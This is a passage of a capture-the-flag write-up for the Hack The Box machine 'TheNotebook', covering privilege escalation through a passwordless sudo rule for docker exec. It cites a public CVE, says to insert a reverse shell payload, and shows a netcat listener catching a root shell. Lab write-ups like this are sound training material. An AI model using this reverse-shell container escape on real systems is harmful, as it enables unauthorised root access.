Running sudo -l shows that we can run a binary as root with no password
```bash
noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
noah@thenotebook:~$
```
Do some googling around and find that there is a priv esc for this scenario
![[Pasted image 20210707223935.png]]
At this point the privesc is basically following this cve. Change the payload to a reverse shell of your choice, follow the rest of the steps and start a listener on your machine for a root shell
```bash
hunter@kali ~/htb/thenotebook/www$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.10.230] 45294
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```